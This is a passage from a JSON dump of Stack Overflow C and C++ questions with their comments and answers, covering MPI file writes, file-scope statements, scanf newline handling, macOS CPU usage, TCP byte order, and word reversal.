"https://i.stack.imgur.com/rd6rD.png?s=128&g=1", "display_name": "Gilles Gouaillardet", "link": "https://stackoverflow.com/users/8062491/gilles-gouaillardet"}, "edited": false, "score": 0, "creation_date": 1542268870, "post_id": 53289713, "comment_id": 93509701, "body": "each task will handle [sizeof(MPI_DOUBLE)*(L/h)*(L/h)*depth of the slice]. I don&#39;t know if it matters for you but all our computing will be done on the cluster of my university so i&#39;m pretty sure i&#39;ll have enough memory."}], "answers": [{"tags": [], "owner": {"reputation": 4724, "user_id": 1024740, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/1037d544b43c71c34225fac55e0c7750?s=128&d=identicon&r=PG", "display_name": "Rob Latham", "link": "https://stackoverflow.com/users/1024740/rob-latham"}, "is_accepted": false, "score": 0, "last_activity_date": 1543548005, "creation_date": 1543548005, "answer_id": 53550751, "question_id": 53289713, "link": "https://stackoverflow.com/questions/53289713/mpi-file-write-c/53550751#53550751", "title": "MPI_File_write C", "body": "<p>Each process in an MPI program has a local address space.  File I/O changes that: a file is a globally accessible linear stream of bytes.  You need to think about where in the global space each process is writing.   A couple ways to do this:</p>\n\n<ul>\n<li><p>sometimes you can just have each process write to a corresponding chunk of the file.  rank zero writes to the first megabyte, rank 1 to the 2nd, and so on.  Might be too simplistic for your 3d array.</p></li>\n<li><p>For more sophisticated decomposition, you set a \"file view\":  you construct an MPI datatype describing the layout of data on disk.   in your case, MPI_TYPE_CREATE_SUBARRAY is probably what you want: a 3d global matrix and each process contributes some subaray to the global picture. </p></li>\n</ul>\n"}], "owner": {"reputation": 1, "user_id": 10648567, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Vandeghen Renaud", "link": "https://stackoverflow.com/users/10648567/vandeghen-renaud"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 168, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1543548005, "creation_date": 1542144293, "last_edit_date": 1542221985, "question_id": 53289713, "link": "https://stackoverflow.com/questions/53289713/mpi-file-write-c", "title": "MPI_File_write C", "body": "<p>I have to use MPI to compute value of concentration from a 3D matrix.  </p>\n\n<p>I divide my matrix in slices depending on the value of the number of proc I will use. </p>\n\n<p>I get smaller 3D matrix which work independently but I want that the values of concentration they compute to be writen in the same file such as the  0 to n-1 lines are writen by proc 0, n to 2n-1 by proc 1,.. </p>\n\n<p>I know that i can use an offset in the mpi_file_write_at function to perform such a thing but i don't know how to implement it.</p>\n\n<p>I know that an easy solution would be to ask proc 0 to open the file, write and close it then proc 1 opens.</p>\n\n<p>Don't mind the code in itself as it is not finished</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#include &lt;mpi.h&gt;\n\nint main(int argc, char *argv[])\n{\n    char *name = argv[1];\n\n    double h, m, L, T_max, v_x, v_y, v_z, D, r_thresh;\n    unsigned int S;\n\n    FILE *file = fopen(name, \"rb\");\n\n\n    if(!file)\n    {\n        fprintf(stderr, \"Not able to open the file %s\\n\", name);\n    }\n    else\n        printf(\"Able to open the file %s\\n\", name);\n\n    fscanf(file, \"%lf\", &amp;h);\n    fscanf(file, \"%lf\", &amp;m);\n    fscanf(file, \"%lf\", &amp;L);\n    fscanf(file, \"%lf\", &amp;T_max);\n    fscanf(file, \"%lf\", &amp;v_x);\n    fscanf(file, \"%lf\", &amp;v_y);\n    fscanf(file, \"%lf\", &amp;v_z);\n    fscanf(file, \"%lf\", &amp;D);\n    fscanf(file, \"%u\", &amp;S);\n    fscanf(file, \"%lf\", &amp;r_thresh);\n\n    fclose(file);\n\n    if(((L/h) % 2) != 0){\n        printf(\"Uncorrect parameters L and h ! \\n\");\n        return -1;\n    }\n    else{\n        unsigned int edge = (L/h);\n        unsigned int middle = edge/2;\n        unsigned int N = edge+1;\n    }\n    if(((T_max/m) % 1) != 0){\n        printf(\"Uncorrect parameters T_max and m ! \\n\");\n        return -1;\n    }\n    else{\n        unsigned int t_end = T_max/m;\n    }\n\n    unsigned int myrank, nbproc;\n    MPI_Init(&amp;argc, &amp;argv) ;\n    MPI_Comm_rank( MPI_COMM_WORLD , &amp;myrank );\n    MPI_Comm_size( MPI_COMM_WORLD , &amp;nbproc );\n\n    double w = N/nbproc;\n    unsigned int width = round(w);\n    unsigned int k_min, k_max;\n    k_min = myrank*width;\n    k_max = (myrank+1)*width-1;\n    width = width+2; \n    if(nbproc==1){\n        width = N;\n    }\n    else if(myrank==(nbproc-1)){\n        k_max = N-1; \n        width = k_max-k_min+1; \n        width = width+1; \n    }\n    else if(myrank==0){\n        width = width-1; \n    }\n\n\n\n    double ***C ;\n    C = malloc(width * sizeof(*C)); \n    for(k=0 ; k &lt; width ; k++){\n        C[k] = malloc(N * sizeof(**C));\n    }\n    for(k=0 ; k &lt; width ; k++){\n        for(j=0 ; j &lt; N ; j++){\n            C[k][j] = malloc(N * sizeof(***C));\n        }\n    }\n\n\n    unsigned int i,j,k,n;\n    for(k=0 ; k&lt;width ; k++){\n        for(j=0 ; j&lt;N ; j++){\n            for(i=0 ; i&lt;N ; i++){\n                C[k][j][i]=0;\n            }\n        }\n    }\n    if(middle&gt;=k_min &amp;&amp; middle=&lt;k_max){\n        C[middle-k_min][middle][middle] = 1;\n    }\n\n\n    if(myrank==0 || nbproc==1){\n        k_min = k_min +1 ;\n    }\n    if(myrank==(nbproc-1) || nbproc==1){\n        k_max = k_max -1 ;\n    }\n\n\n\n\n\n    for(n=1 ; n&lt;T_max ; n++){\n\n        char *c = \"c_\";\n        char buffer[10];\n        itoa(n,buffer,2);\n        strcat(c,buffer);\n\n        // I want to write some value stored in a buffer now\n        // computed by different process in the same file \n        // MPI_File_write_at ???\n\n\n    }\n\n    for(k=0 ; k &lt; width ; k++){\n        for(j=0 ; j &lt; N ; j++){\n            free(C[k][j]);\n            }\n        free(C[k]);\n    }\n    free(C);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1542143531, "post_id": 53289515, "comment_id": 93460861, "body": "Where is this code ? Is it <b>all</b> within a function ? If not, what is/is-not where? A <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> is required for us to help. Otherwise all we&#39;re doing is throwing out guesses, which makes for <i>terrible</i> answers. And fyi, this code dereferences an indeterminate pointer, so after fixing your compile issue you have <i>undefined behavior</i> on your horizon."}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 1, "creation_date": 1542144436, "post_id": 53289515, "comment_id": 93461213, "body": "I recommend not hiding pointers in a typedef.  It usually leads to bad things."}], "answers": [{"comments": [{"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 0, "creation_date": 1542144657, "post_id": 53289549, "comment_id": 93461317, "body": "This does solve the problem in the question, but I think it still has the issue of dereferencing an uninitialized pointer."}], "tags": [], "owner": {"reputation": 58292, "user_id": 34824, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ri8DI.jpg?s=128&g=1", "display_name": "abelenky", "link": "https://stackoverflow.com/users/34824/abelenky"}, "is_accepted": true, "score": 3, "last_activity_date": 1542143503, "creation_date": 1542143503, "answer_id": 53289549, "question_id": 53289515, "link": "https://stackoverflow.com/questions/53289515/expected-asm-or-attribute-before-token/53289549#53289549", "title": "&quot;Expected &#39;=&#39;, &#39;,&#39;, &#39;;&#39;, &#39;asm&#39; or &#39;__attribute__&#39; before &#39;-&gt;&#39; token", "body": "<p>You don't have any functions in your code, and Instructions can only appear in functions.</p>\n\n<p>The following lines are Instructions, which must be in a function:</p>\n\n<pre><code>LAMBDA-&gt;label='A';\nLAMBDA-&gt;leftchild=NULL;\nLAMBDA-&gt;rightchild=NULL;\n</code></pre>\n\n<hr>\n\n<p>I recommend putting these instructions into a main function:</p>\n\n<pre><code>typedef char labeltype;\n\ntypedef struct celltag{\nlabeltype label;\nstruct celltag* leftchild;\nstruct celltag* rightchild;\n}celltype;\n\ntypedef celltype* BiTree;\ntypedef celltype* node;\n\nint main(void)   /* This is where a function starts */\n{\n    node LAMBDA;\n\n    printf(\"Program Start\\n\");\n    LAMBDA-&gt;label='A';\n    LAMBDA-&gt;leftchild=NULL;\n    LAMBDA-&gt;rightchild=NULL;\n    printf(\"Program End\\n\");\n    return 0;\n}    /* This is the end of the function */\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 10648565, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3999f5eae26c34a50739acdcec72e9ab?s=128&d=identicon&r=PG&f=1", "display_name": "Lena", "link": "https://stackoverflow.com/users/10648565/lena"}, "edited": false, "score": 0, "creation_date": 1542144083, "post_id": 53289559, "comment_id": 93461070, "body": "Will it be enough to declare just <code>node LAMBDA;</code> where it is now, so I can use it in other functions, but add the other information to LAMBDA when I get to writing the <code>main()</code> function?"}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "reply_to_user": {"reputation": 13, "user_id": 10648565, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3999f5eae26c34a50739acdcec72e9ab?s=128&d=identicon&r=PG&f=1", "display_name": "Lena", "link": "https://stackoverflow.com/users/10648565/lena"}, "edited": false, "score": 0, "creation_date": 1542144274, "post_id": 53289559, "comment_id": 93461154, "body": "@Lena: It will be enough to stop the compiler from complaining. Whether it is enough to make the code work as intended is something only you can know. In any case, your <code>LAMBDA</code> is a <i>pointer</i>. It points to nowhere initially. You can&#39;t access data fields through a pointer that points to nowhere. For example, the current version of abelenky&#39;s code is broken for this very reason."}], "tags": [], "owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "is_accepted": false, "score": 1, "last_activity_date": 1542143548, "creation_date": 1542143548, "answer_id": 53289559, "question_id": 53289515, "link": "https://stackoverflow.com/questions/53289515/expected-asm-or-attribute-before-token/53289559#53289559", "title": "&quot;Expected &#39;=&#39;, &#39;,&#39;, &#39;;&#39;, &#39;asm&#39; or &#39;__attribute__&#39; before &#39;-&gt;&#39; token", "body": "<p>In C language all executable code is written <em>inside functions</em>. You can't just write statements in the middle of the file. </p>\n\n<p>At file level in C you can only write declarations. Everything in your code are declarations, until you get to the last three lines. The last three lines are not declarations. You can't write them at file level.</p>\n"}], "owner": {"reputation": 13, "user_id": 10648565, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3999f5eae26c34a50739acdcec72e9ab?s=128&d=identicon&r=PG&f=1", "display_name": "Lena", "link": "https://stackoverflow.com/users/10648565/lena"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 224, "favorite_count": 0, "accepted_answer_id": 53289549, "answer_count": 2, "score": 0, "last_activity_date": 1542144283, "creation_date": 1542143330, "last_edit_date": 1542144283, "question_id": 53289515, "link": "https://stackoverflow.com/questions/53289515/expected-asm-or-attribute-before-token", "title": "&quot;Expected &#39;=&#39;, &#39;,&#39;, &#39;;&#39;, &#39;asm&#39; or &#39;__attribute__&#39; before &#39;-&gt;&#39; token", "body": "<p>So here's the code from the start to the lines my errors appear. I checked more than once every pointer relation and sintax rules, but for the last three lines the complier says: </p>\n\n<pre><code>\"Expected '=', ',', ';', 'asm' or '__attribute__' before '-&gt;' token\n</code></pre>\n\n<p>What's wrong/missing?</p>\n\n<p>Code:</p>\n\n<pre><code>typedef char labeltype;\n\ntypedef struct celltag{\nlabeltype label;\nstruct celltag* leftchild;\nstruct celltag* rightchild;\n}celltype;\n\ntypedef celltype* BiTree;\ntypedef celltype* node;\n\nnode LAMBDA;\nLAMBDA-&gt;label='A';\nLAMBDA-&gt;leftchild=NULL;\nLAMBDA-&gt;rightchild=NULL;\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1542142988, "post_id": 53289421, "comment_id": 93460656, "body": "What value is in <code>c</code>?  What if you add parentheses to the expression for the <code>do-while</code> loop?"}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 2, "creation_date": 1542142993, "post_id": 53289421, "comment_id": 93460659, "body": "This is almost certainly the <a href=\"https://stackoverflow.com/questions/13473693/scanf-getchar-function-is-skipped\">usual headache with mixing <code>scanf</code> and <code>getchar</code></a>.  <code>scanf</code> doesn&#39;t consume the newline after the number, so <code>c</code> winds up having the value <code>&#39;\\n&#39;</code>, which is not equal to <code>&#39;y&#39;</code> or <code>&#39;Y&#39;</code>.  Instead use <code>fgets</code> to read entire lines at a time, and convert text to machine numbers with <code>strtol</code> and friends."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1542144887, "post_id": 53289421, "comment_id": 93461421, "body": "Also, functions such as <code>scanf_s()</code> are from Annex K of the C standard.  They are optional, so they&#39;re not portable.  Not only that, <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1967.htm#tc\" rel=\"nofollow noreferrer\">this is the state of Annex K</a>: &quot;we propose that Annex K be either removed from the next revision of the C standard, or deprecated and then removed.&quot;.  The Microsoft implementation is even worse: &quot;As a result of the numerous deviations from the specification the Microsoft implementation cannot be considered conforming or portable.&quot;"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 10648537, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89f574358536df3d21ba85bca7067e16?s=128&d=identicon&r=PG&f=1", "display_name": "istyl", "link": "https://stackoverflow.com/users/10648537/istyl"}, "edited": false, "score": 0, "creation_date": 1542144387, "post_id": 53289572, "comment_id": 93461194, "body": "It works!!! Thank you very much for the correct code and the things i should look out for next time i do something similar."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 1, "last_activity_date": 1542143624, "creation_date": 1542143624, "answer_id": 53289572, "question_id": 53289421, "link": "https://stackoverflow.com/questions/53289421/my-do-while-is-terminating-instead-of-continuing-my-c-program/53289572#53289572", "title": "my do-while is terminating instead of continuing my C program", "body": "<p>The character read by <code>getchar()</code> is the pending newline that was typed after the number but was not consumed by <code>scanf_s</code>.</p>\n\n<p>You should consume this pending newline before reading the next character for the continuation test, which can be done easily in <code>scanf</code> with a space before the <code>%c</code> conversion specification:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int a;\n    char c;\n\n    for (;;) {\n        printf(\"dwse mou enan arithmo: \");\n        if (scanf_s(\"%d\", &amp;a) != 1)\n            break;\n\n        if (a &gt;= 0) {\n            if (a % 2 == 0)\n                printf(\"the number %d is even\\n\", a);\n            else\n                printf(\"the number %d is odd\\n\", a);\n        } else {\n            printf(\"the program does not accept negative numbers\\n\");\n        }\n\n        printf(\"if you want to proceed press y or Y: \");\n        if (scanf_s(\" %c\", &amp;c) != 1 || (c != 'y' &amp;&amp; c != 'Y'))\n            break;\n    }\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 10648537, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89f574358536df3d21ba85bca7067e16?s=128&d=identicon&r=PG&f=1", "display_name": "istyl", "link": "https://stackoverflow.com/users/10648537/istyl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 53289572, "answer_count": 1, "score": 1, "last_activity_date": 1542143624, "creation_date": 1542142793, "last_edit_date": 1542143522, "question_id": 53289421, "link": "https://stackoverflow.com/questions/53289421/my-do-while-is-terminating-instead-of-continuing-my-c-program", "title": "my do-while is terminating instead of continuing my C program", "body": "<p>When I'm trying to run without debugging the code everything runs smooth but as soon as I press <code>Y</code> so I can continue inputting numbers it terminates (gotta say I need help)  </p>\n\n<pre><code>int main() {\n    int a;\n    char c;\n\n    do {\n        puts(\"dwse mou enan arithmo: \");\n        scanf_s(\"%d\", &amp;a);\n\n        if (a &gt; 0) {\n            if (a % 2 == 0)\n                printf(\"the number %d is even \\n\", a);\n            else\n                printf(\"the number %d is odd \\n\", a);\n        } else {\n            printf(\"the program won't run with negative numbers \\n\");\n        }\n\n        printf(\"if you want to proceed press y or Y :\");\n        c = getchar();\n        getchar();\n    } while (c == 'y' || c == 'Y');\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "macos", "cpu-usage"], "comments": [{"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 0, "creation_date": 1542144533, "post_id": 53289411, "comment_id": 93461258, "body": "See if theres a mac equivalent to <a href=\"https://docs.microsoft.com/en-us/windows/desktop/perfctrs/examples\" rel=\"nofollow noreferrer\">docs.microsoft.com/en-us/windows/desktop/perfctrs/examples</a>.  Im sure that if they have a task manager there is something that must do the polling."}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542150164, "post_id": 53289411, "comment_id": 93463261, "body": "Does MacOS has <code>&#47;proc&#47;stat</code> file ?"}, {"owner": {"reputation": 677, "user_id": 3283414, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/2c3b8ae04c67a36ff3cecade8702071b?s=128&d=identicon&r=PG&f=1", "display_name": "RuLoViC", "link": "https://stackoverflow.com/users/3283414/rulovic"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542151016, "post_id": 53289411, "comment_id": 93463467, "body": "@KamilCuk nop, it does not"}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542151333, "post_id": 53289411, "comment_id": 93463545, "body": "I thjink look <a href=\"https://stackoverflow.com/questions/63166/how-to-determine-cpu-and-memory-consumption-from-inside-a-process\">here</a>"}, {"owner": {"reputation": 677, "user_id": 3283414, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/2c3b8ae04c67a36ff3cecade8702071b?s=128&d=identicon&r=PG&f=1", "display_name": "RuLoViC", "link": "https://stackoverflow.com/users/3283414/rulovic"}, "edited": false, "score": 0, "creation_date": 1542277307, "post_id": 53289411, "comment_id": 93514468, "body": "I did, but there no method to get cpu for only one app, only total CPU. Any other ideas please ?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user4434329"}, "edited": false, "score": 0, "creation_date": 1542304844, "post_id": 53289411, "comment_id": 93531273, "body": "Looks like you need this: <a href=\"https://stackoverflow.com/a/8737816/4434329\">stackoverflow.com/a/8737816/4434329</a>"}, {"owner": {"reputation": 677, "user_id": 3283414, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/2c3b8ae04c67a36ff3cecade8702071b?s=128&d=identicon&r=PG&f=1", "display_name": "RuLoViC", "link": "https://stackoverflow.com/users/3283414/rulovic"}, "edited": false, "score": 0, "creation_date": 1542353152, "post_id": 53289411, "comment_id": 93545871, "body": "no, that way computes cpu load counting all apps not only &quot;mine&quot;"}, {"owner": {"reputation": 677, "user_id": 3283414, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/2c3b8ae04c67a36ff3cecade8702071b?s=128&d=identicon&r=PG&f=1", "display_name": "RuLoViC", "link": "https://stackoverflow.com/users/3283414/rulovic"}, "edited": false, "score": 0, "creation_date": 1542461524, "post_id": 53289411, "comment_id": 93581186, "body": "No ideas anyone?"}], "owner": {"reputation": 677, "user_id": 3283414, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/2c3b8ae04c67a36ff3cecade8702071b?s=128&d=identicon&r=PG&f=1", "display_name": "RuLoViC", "link": "https://stackoverflow.com/users/3283414/rulovic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 69, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1542142733, "creation_date": 1542142733, "question_id": 53289411, "link": "https://stackoverflow.com/questions/53289411/how-to-compute-percentage-of-cpu-used-by-an-app", "title": "how to compute percentage of CPU used by an app", "body": "<p>I am working on c++ application for Mac OS</p>\n\n<p>There I would like to get percentage of CPU that my app is using.</p>\n\n<p>I have seen getrusage() gives me cpu time used by the app.</p>\n\n<pre><code>   timeval userCPU = usage.ru_utime;\n   timeval sysCPU = usage.ru_stime;\n</code></pre>\n\n<p>Do both values in the struct store cpu time consumed by the app. Is there any way to get cpu time used by the whole computer?</p>\n\n<p>If not, how can I get the percentage?</p>\n\n<p>Thanks in advance</p>\n"}, {"tags": ["c", "networking", "byte"], "comments": [{"owner": {"reputation": 8362, "user_id": 2993960, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/svN5z.jpg?s=128&g=1", "display_name": "Fiddling Bits", "link": "https://stackoverflow.com/users/2993960/fiddling-bits"}, "edited": false, "score": 1, "creation_date": 1542142670, "post_id": 53289277, "comment_id": 93460531, "body": "Welcome to Stack Overflow! Please take the <a href=\"https://stackoverflow.com/tour\">tour</a> and read <a href=\"https://stackoverflow.com/help/how-to-ask\"><i>How To Ask A Good Question</i></a> and <a href=\"https://stackoverflow.com/help/mcve\"><i>How To Create A Minimal, Complete, And Verifiable Example</i></a>."}], "answers": [{"tags": [], "owner": {"reputation": 2597, "user_id": 4755321, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e93c2832d8928731e8e5d2f6d665c4a0?s=128&d=identicon&r=PG&f=1", "display_name": "Jacek \u015alimok", "link": "https://stackoverflow.com/users/4755321/jacek-%c5%9alimok"}, "is_accepted": false, "score": 0, "last_activity_date": 1542144686, "creation_date": 1542144686, "answer_id": 53289808, "question_id": 53289277, "link": "https://stackoverflow.com/questions/53289277/how-to-process-network-byte-order-in-c/53289808#53289808", "title": "How to process network byte order in C", "body": "<p>To answer your questions first:</p>\n\n<blockquote>\n  <p>With what Type do I need to initialize the buffer</p>\n</blockquote>\n\n<p>By \"type\" I assume you actually need value, as in what you initialize the buffer with. To answer - you don't need to fill it with some kind of known value at all. The return value of <code>recv</code> function tells you how many bytes you've received. Everything within that amount is valid data, everything else you can treat as garbage and can use the remaining space to for example null-terminate the string. Assuming you transfer only strings of course.</p>\n\n<blockquote>\n  <p>how do I then process it (split it into an array of different integers ie)</p>\n</blockquote>\n\n<p>That's what protocols and serialization methods deal with. Those tell you things like the oder in which data gets sent across, how to interpret it, as well as tell you how to convert the data your program holds into byte buffer (argument to <code>send</code>) and then how to convert it back to get the same data as before the conversion (reading from <code>recv</code>).</p>\n\n<p>Now to further elaborate, given the limited data given in the question: Unless you exchange data with a host that you know uses certain protocol (HTTP for example) or transfers data in some known format (JSON for example) and therefore could use some kind of library to do this job for you, you implement serialization and deserialization on your own. In short - you must know how the remote end converted data it sent into a byte buffer and you do the same operations in reverse order. Assuming you're on the same platform as the connected host, for a very quick proof-of-concept you can go with <code>memcpy</code> but any further than that I <strong>do not recommend it</strong>. How you go about this is totally up to you. Personally I'd recommend looking into the topic of data serialization, starting from simple examples and building your way up. Such topic is too broad to explain even in a minimal form in a single answer.</p>\n"}], "owner": {"reputation": 1, "user_id": 10648505, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/727f5e7be85d118225b2a6a75834282a?s=128&d=identicon&r=PG&f=1", "display_name": "kleinerberg", "link": "https://stackoverflow.com/users/10648505/kleinerberg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 48, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1542144686, "creation_date": 1542142133, "last_edit_date": 1542143988, "question_id": 53289277, "link": "https://stackoverflow.com/questions/53289277/how-to-process-network-byte-order-in-c", "title": "How to process network byte order in C", "body": "<p>I have a question regarding C and byte order. I am programming a small TCP server which is receiving a message. I however have trouble receiving messages. I can only find TCP examples of transferring strings. However, my message includes single toggled bits.</p>\n\n<pre><code>recv(socketClient, buffer, strlen(buffer), 0);\n</code></pre>\n\n<p>I am specifically asking the following: What Type do I need to initialize the buffer and how do I then process it (split it into an array of different integers ie.)</p>\n\n<p>My current method for Strings:</p>\n\n<pre><code>int max_size = 512;\n\nchar buffer[max_size];// buffer to read server message\nmemset(buffer, ' ', sizeof(buffer)); //fill buffer memory with an empty char\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1542141894, "post_id": 53289198, "comment_id": 93460241, "body": "Don&#39;t hard code character codes. <code>char space = 32;</code> should be <code>char space = &#39; &#39;;</code>"}, {"owner": {"reputation": 3306, "user_id": 1951463, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nZ8Ii.jpg?s=128&g=1", "display_name": "Terry Carmen", "link": "https://stackoverflow.com/users/1951463/terry-carmen"}, "edited": false, "score": 0, "creation_date": 1542141917, "post_id": 53289198, "comment_id": 93460253, "body": "The last letter is missing because you&#39;re writing a space on top of it. with &quot;input[length-1] = space;&quot; Why are you doing that? Do you need a space for some reason?"}, {"owner": {"reputation": 7873, "user_id": 2225104, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/195de66794c596e35bc145c80e9f5515?s=128&d=identicon&r=PG", "display_name": "BitTickler", "link": "https://stackoverflow.com/users/2225104/bittickler"}, "edited": false, "score": 0, "creation_date": 1542143424, "post_id": 53289198, "comment_id": 93460830, "body": "So much wrong with this code. It starts with the way you define the function itself. What is length? The size of the input including or excluding the terminating <code>\\0</code> of the string? Will output have enough capacity to take the result? Or will this function become an accessory to murder... errm... mean memory corruption? Then, in the implementation you could follow a readable plan like: Turn input into words - push words on a stack, then pop from the stack and append to output. But yeah - its C - you don&#39;t even have access to a stack implementation. Use C++ ;)"}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 10516686, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70a4245b6b52b26f978492e52c7a47c4?s=128&d=identicon&r=PG&f=1", "display_name": "Nangs", "link": "https://stackoverflow.com/users/10516686/nangs"}, "edited": false, "score": 0, "creation_date": 1542144008, "post_id": 53289544, "comment_id": 93461038, "body": "That kinda solved the problem. Now I have the last letter for my &quot;six&quot;, but the list is all messed up with &quot;three&quot; being in the first line, then &quot; two one&quot; in the second and &quot;six five four&quot; in the third one, as it should be."}], "tags": [], "owner": {"reputation": 3680, "user_id": 4134099, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/yHvdj.png?s=128&g=1", "display_name": "BattleTested_\u0437\u0430\u043a\u0430\u043b\u0451\u043d\u043d\u044b\u0439 \u0432 \u0431\u043e\u044e", "link": "https://stackoverflow.com/users/4134099/battletested-%d0%b7%d0%b0%d0%ba%d0%b0%d0%bb%d1%91%d0%bd%d0%bd%d1%8b%d0%b9-%d0%b2-%d0%b1%d0%be%d1%8e"}, 